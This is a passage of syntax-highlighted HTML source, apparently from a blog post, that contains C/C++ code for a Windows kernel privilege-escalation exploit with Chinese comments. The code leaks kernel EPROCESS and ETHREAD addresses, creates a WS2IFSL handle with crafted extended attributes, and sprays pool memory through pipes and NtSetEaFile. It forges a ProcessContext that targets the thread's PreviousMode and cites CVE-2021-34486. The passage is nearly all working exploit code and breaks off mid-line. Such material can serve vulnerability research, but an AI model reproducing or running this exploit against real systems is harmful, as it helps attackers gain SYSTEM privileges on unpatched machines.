g_CurrentEprocess;</span><br><span class="line">ULONG64   g_ExploitEthread;</span><br><span class="line"></span><br><span class="line">HANDLE    g_ThreadExploitHandle;</span><br><span class="line">DWORD     g_CurrentPid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NtQuerySystemInfomation Leak Information</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_TABLE_ENTRY_INFO</span> &#123;</span><br><span class="line">	USHORT UniqueProcessId;</span><br><span class="line">	USHORT CreatorBackTraceIndex;</span><br><span class="line">	UCHAR ObjectTypeIndex;</span><br><span class="line">	UCHAR HandleAttributes;</span><br><span class="line">	USHORT HandleValue;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	ULONG GrantedAccess;</span><br><span class="line">	LONG __PADDING__[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG NumberOfHandles;</span><br><span class="line">	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation			(SYSTEM_INFORMATION_CLASS)0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformation			(SYSTEM_INFORMATION_CLASS)0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">LeakByQuerySystemInfomation</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD CurPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">	g_CurrentPid = CurPid;</span><br><span class="line">	<span class="comment">// Process</span></span><br><span class="line">	HANDLE hSelf = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, <span class="number">0</span>, CurPid);</span><br><span class="line">	<span class="keyword">if</span> (hSelf == INVALID_HANDLE_VALUE || hSelf == <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error OpenProcess\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// kthread and ktoken</span></span><br><span class="line">	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	ULONG OutBufLen = <span class="number">0</span>;</span><br><span class="line">	NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, <span class="number">0x100</span>, &amp;OutBufLen);</span><br><span class="line">	<span class="keyword">if</span> (status == STATUS_INFO_LENGTH_MISMATCH) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(HandleInfo);</span><br><span class="line">		HandleInfo = (SYSTEM_HANDLE_INFORMATION*)<span class="built_in">malloc</span>(OutBufLen);</span><br><span class="line">		status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, OutBufLen, &amp;OutBufLen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HandleInfo == <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtQuerySystemInformation SystemHandleInformation\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// PID 当前进程 Handle 没有指定</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line">		<span class="keyword">if</span> (handleInfo.UniqueProcessId == CurPid)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] PID %d\tObject %#llx\n&quot;</span>, handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 找到 ExploitThread 的ETHREAD</span></span><br><span class="line">	<span class="comment">// 找到System的 EPROCESS</span></span><br><span class="line">	<span class="comment">// 找到当前进程的 EPROCESS</span></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)g_ThreadExploitHandle)</span><br><span class="line">		&#123;</span><br><span class="line">			g_ExploitEthread = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread PID: %d\thandle: %#x\t_KTHREAD: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 当前进程 Eprocess</span></span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)hSelf) </span><br><span class="line">		&#123;</span><br><span class="line">			g_CurrentEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Current PID: %d\thandle: %#x\t_EPROCESS: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// System 进程 Eprocess</span></span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == <span class="number">0x4</span> &amp;&amp; HandleEntry.HandleValue == <span class="number">0x4</span>) </span><br><span class="line">		&#123; <span class="comment">// SYSTEM Process has a handle to itself</span></span><br><span class="line">			g_SystemEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] System _EPROCESS: 0x%llx\r\n&quot;</span>, g_SystemEprocess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (g_ExploitEthread != <span class="number">0</span> &amp;&amp; g_CurrentEprocess != <span class="number">0</span> &amp;&amp; g_SystemEprocess) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(HandleInfo);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Get kthread and ktoken</span></span><br><span class="line">	<span class="keyword">if</span> (g_ExploitEthread == <span class="number">0</span> || g_CurrentEprocess == <span class="number">0</span> || g_SystemEprocess == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error Leak\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ws2ifsl</span></span><br><span class="line"><span class="comment">// wdm.h</span></span><br><span class="line"><span class="comment">// 结构提供扩展属性 (EA) 信息</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG NextEntryOffset;</span><br><span class="line">	UCHAR Flags;</span><br><span class="line">	UCHAR EaNameLength;</span><br><span class="line">	USHORT EaValueLength;</span><br><span class="line">	CHAR EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROC_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE ApcThread;          <span class="comment">// 0x00</span></span><br><span class="line">	PVOID RequestQueueRoutine; <span class="comment">// 0x04</span></span><br><span class="line">	PVOID CancelQueueRoutine;  <span class="comment">// 0x08</span></span><br><span class="line">	PVOID ApcContext;          <span class="comment">// 0x0C</span></span><br><span class="line">	PVOID unknown3;            <span class="comment">// 0x10</span></span><br><span class="line">&#125; PROC_DATA, * PPROC_DATA;</span><br><span class="line"></span><br><span class="line">HANDLE g_ThreadApcHandle;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray Ws2P</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayWs2P      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray NpFr</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayPipe      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray tag IO</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayEaFile    = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set to cpu number later</span></span><br><span class="line">DWORD CountConcurrentSprayEaFile  = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayMm        = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ws2P Process</span></span><br><span class="line">HANDLE* g_ProcessList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateProcessFileHandle</span><span class="params">(HANDLE hThreadApc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING deviceName;</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;deviceName, (PWSTR)<span class="string">L&quot;\\Device\\WS2IFSL\\NifsPvd&quot;</span>);</span><br><span class="line"></span><br><span class="line">	OBJECT_ATTRIBUTES object;</span><br><span class="line">	<span class="built_in">InitializeObjectAttributes</span>(&amp;object, &amp;deviceName, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PFILE_FULL_EA_INFORMATION pFileEa =</span><br><span class="line">		(PFILE_FULL_EA_INFORMATION)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pFileEa == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error malloc\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pFileEa-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">	pFileEa-&gt;Flags = <span class="number">0</span>;</span><br><span class="line">	pFileEa-&gt;EaNameLength = <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	pFileEa-&gt;EaValueLength = <span class="built_in">sizeof</span>(PROC_DATA);</span><br><span class="line">	<span class="built_in">memcpy</span>(pFileEa-&gt;EaName, <span class="string">&quot;NifsPvd&quot;</span>, pFileEa-&gt;EaNameLength + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	PPROC_DATA pProcData = (PPROC_DATA)((<span class="type">char</span>*)pFileEa + <span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">4</span>);</span><br><span class="line">	pProcData-&gt;ApcThread = hThreadApc;</span><br><span class="line">	pProcData-&gt;RequestQueueRoutine = (PVOID)<span class="number">0xaaaaaaaa</span>;</span><br><span class="line">	pProcData-&gt;CancelQueueRoutine = (PVOID)<span class="number">0xbbbbbbbb</span>;</span><br><span class="line">	pProcData-&gt;ApcContext = (PVOID)<span class="number">0xcccccccc</span>;</span><br><span class="line">	pProcData-&gt;unknown3 = (PVOID)<span class="number">0xdddddddd</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE handle = INVALID_HANDLE_VALUE;</span><br><span class="line">	IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// object -&gt; handle</span></span><br><span class="line">	NTSTATUS status = <span class="built_in">NtCreateFile</span>(</span><br><span class="line">		&amp;handle, </span><br><span class="line">		MAXIMUM_ALLOWED, </span><br><span class="line">		&amp;object, </span><br><span class="line">		&amp;IoStatusBlock, </span><br><span class="line">		<span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>, FILE_OPEN_IF, </span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		pFileEa,</span><br><span class="line">		<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA)</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NT_ERROR</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtCreateFile\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileEa);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pFileEa);</span><br><span class="line">	<span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io Pool</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">APCThread</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">0x100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NpFr</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PIPE_HANDLES</span> &#123;</span><br><span class="line">	HANDLE r;</span><br><span class="line">	HANDLE w;</span><br><span class="line">&#125; PIPE_HANDLES;</span><br><span class="line"></span><br><span class="line">std::vector&lt;PIPE_HANDLES&gt; g_Pipe;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SprayPipe</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr begin...\r\n&quot;</span>);</span><br><span class="line">	ULONG payloadSize = size - <span class="number">0x40</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayPipe; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		PIPE_HANDLES pipe;</span><br><span class="line">		UCHAR* payload = (UCHAR*)<span class="built_in">malloc</span>(payloadSize);</span><br><span class="line">		<span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;malloc failed, err: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memset</span>(payload, <span class="string">&#x27;p&#x27;</span>, payloadSize);</span><br><span class="line">		BOOL res = <span class="built_in">CreatePipe</span>(&amp;pipe.r, &amp;pipe.w, <span class="literal">NULL</span>, payloadSize);</span><br><span class="line">		<span class="keyword">if</span> (res == FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreatePipe\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		DWORD resultLength;</span><br><span class="line">		<span class="comment">// res = WriteFile(writePipe, payload, sizeof(payload), &amp;resultLength, NULL);</span></span><br><span class="line">		res = <span class="built_in">WriteFile</span>(pipe.w, payload, payloadSize, &amp;resultLength, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (res == FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;Error WriteFile\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		g_Pipe.<span class="built_in">push_back</span>(pipe);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtSetEaFile)</span><span class="params">(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG)</span></span>;</span><br><span class="line">PNtSetEaFile NtSetEaFile;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">Setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	g_hDevice = <span class="built_in">CreateFileW</span>(DEVICE, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == g_hDevice)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFileW DEVICE\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// wprintf(L&quot;Open device %s succeeded, handle: %p\n&quot;, DEVICE, ghDev);</span></span><br><span class="line"></span><br><span class="line">	g_ThreadApcHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, APCThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_ThreadApcHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_ProcessList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P);</span><br><span class="line">	<span class="keyword">if</span> (g_ProcessList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_ProcessList\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(g_ProcessList, <span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P, <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">	NtSetEaFile = (PNtSetEaFile)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtSetEaFile&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (NtSetEaFile == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress(NtSetEaFile)\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io</span></span><br><span class="line"><span class="comment">// 通过 payloadSize 可以控制chunk的大小</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hPEAuth;</span><br><span class="line">	UCHAR* payload;</span><br><span class="line">	ULONG PayloadSize;</span><br><span class="line">&#125; ParamSprayEaFile;</span><br><span class="line"></span><br><span class="line">HANDLE* g_EaThreadList;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadSprayEaFile</span><span class="params">(LPVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ParamSprayEaFile* _param = (ParamSprayEaFile*)param;</span><br><span class="line">	IO_STATUS_BLOCK iostatus;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">NtSetEaFile</span>(_param-&gt;hPEAuth, &amp;iostatus, _param-&gt;payload, _param-&gt;PayloadSize);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EaFile =&gt; Io</span></span><br><span class="line"><span class="comment">// 详情：CVE-2021-34486</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SprayEaFile</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 首先得获得核心数</span></span><br><span class="line">	<span class="comment">// SYSTEM_INFO SystemInfo;</span></span><br><span class="line">	<span class="comment">// GetSystemInfo(&amp;SystemInfo);</span></span><br><span class="line">	<span class="comment">// GetNativeSystemInfo(&amp;SystemInfo);</span></span><br><span class="line">	<span class="comment">// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;</span></span><br><span class="line">	CountConcurrentSprayEaFile = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io ...\r\n&quot;</span>);</span><br><span class="line">	ParamSprayEaFile* param = (ParamSprayEaFile*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ParamSprayEaFile));</span><br><span class="line">	<span class="keyword">if</span> (param == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc ParamSprayEaFile\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	param-&gt;PayloadSize = size - <span class="number">0x10</span>;</span><br><span class="line">	param-&gt;hPEAuth = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\PEAuth&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;hPEAuth == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFile PEAuth \r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	param-&gt;payload = (UCHAR*)<span class="built_in">malloc</span>(param-&gt;PayloadSize);</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;payload == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc payload\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(param-&gt;payload, param-&gt;PayloadSize, <span class="string">&#x27;H&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fake ProcessContext</span></span><br><span class="line">	*(ULONG32*)(&amp;param-&gt;payload[<span class="number">0x0</span>]) = <span class="number">0x636F7250</span>; <span class="comment">// Proc</span></span><br><span class="line">	<span class="comment">// FsContext-&gt;RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode</span></span><br><span class="line">	<span class="comment">// !!!!! Attation + 0x30</span></span><br><span class="line">	*(ULONG64*)(&amp;param-&gt;payload[<span class="number">0x38</span>]) = g_ExploitEthread + <span class="number">0x232</span> + <span class="number">0x30</span>; </span><br><span class="line">	<span class="comment">// fake ProcessContext</span></span><br><span class="line"></span><br><span class="line">	g_EaThreadList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountConcurrentSprayEaFile);</span><br><span class="line">	<span class="keyword">if</span> (g_EaThreadList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_EaThreadList\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EaThreadList[i] = <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ThreadSprayEaFile, param, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (g_EaThreadList[i] == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread ThreadSprayEaFile\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 为指定线程设置处理器关联掩码</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">SetThreadAffinityMask</span>(g_EaThreadList[i], <span class="number">1</span> &lt;&lt; i) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error SetThreadAffinityMask\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 递减线程的挂起计数。 当暂停计数减为零时，将恢复线程的执行</span></span><br><span class="line">		<span class="built_in">ResumeThread</span>(g_EaThreadList[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 等待，直到一个或所有指定对象处于信号状态或超时间隔已过。</span></span><br><span class="line">	<span class="built_in">WaitForMultipleObjects</span>(CountConcurrentSprayEaFile, g_EaThreadList, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(g_EaThreadList[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(param-&gt;hPEAuth);</span><br><span class="line">	<span class="built_in">free</span>(param-&gt;payload);</span><br><span class="line">	<span class="built_in">free</span>(param);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io done\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Cleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] cleanup...\r\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">CloseHandle</span>(g_hDevice);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (g_Pipe.<span class="built_in">size</span>() != <span 